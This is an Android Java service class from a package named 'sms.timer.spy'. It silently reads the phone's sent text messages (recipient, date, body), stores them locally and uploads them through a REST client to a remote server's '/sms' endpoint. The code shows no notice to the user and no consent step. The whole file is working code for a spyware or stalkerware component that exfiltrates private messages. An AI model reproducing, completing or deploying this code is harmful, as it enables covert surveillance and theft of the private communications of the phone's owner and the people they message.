package com.example.sms.timer.spy;

import adre310.x10.mx.client.RestClient;
import android.app.IntentService;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.util.Log;

public class SyncService extends IntentService {

private static String[] projection=new String[] {
		"_id",
		"address",
		"date",
		"body"
};

	public SyncService() {
		super("SyncService");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent arg0) {
		Context context = getApplicationContext();		
		
        SharedPreferences preferences=PreferenceManager.getDefaultSharedPreferences(context);
        long lastRead=preferences.getLong("lastRead", 0L);

        boolean ifReaded=false;
		Cursor cur = context.getContentResolver().query(
	    		Uri.parse("content://sms/sent"), projection, "_id > "+Long.toString(lastRead), null,"_id ASC"
	    		);
		
	    while (cur.moveToNext()) {
	    	ifReaded=true;
	    	long id=cur.getLong(0);
	    	if(id>lastRead)
	    		lastRead=id;
	    	
	    	String address=cur.getString(1);
	    	long date=cur.getLong(2);
	    	String body=cur.getString(3);

	    	//Log.i(this.getClass().getName(), 
	    	//		"From " + Long.toString(id) + 
	    	//		" : "+ new Date( date).toString() + 
	    	//		" : "+ address + " : " + body);
	    	
			ContentValues iv=new ContentValues();
			iv.put("_id", id);
			iv.put("address", address);
			iv.put("date", date);
			iv.put("body", body);
			
			context.getContentResolver().insert(MyDBProvider.CONTENT_URI_MY, iv);
	    }
	    
	    Log.i(this.getClass().getName(), "LastRead: "+Long.toString(lastRead));
	    if(ifReaded) {
	    	Editor editor=preferences.edit();
	    	editor.putLong("lastRead", lastRead);
	    	editor.commit();
	    }

        long lastServer=preferences.getLong("lastServer", 0L);
        if(lastRead > lastServer) 
        {
    	  Log.i(this.getClass().getName(), "Sync");

  		  ConnectivityManager cm=(ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
  		  NetworkInfo networkInfo = cm.getActiveNetworkInfo();
  		  if (networkInfo != null && networkInfo.isConnected()) {
  	    	Log.i(this.getClass().getName(), "Sync Network");

  	    	try {
  	    		RestClient client=new RestClient(context);
  			    client.postMethod("/sms", new SerialSMS(context, lastServer), new DeserialSMS(context));
  	    		
  	    	} catch(Exception ex) {
  	    		Log.e(this.getClass().getName(), "Sync Network", ex);
  	    	}
  		  }
        }
	}

}
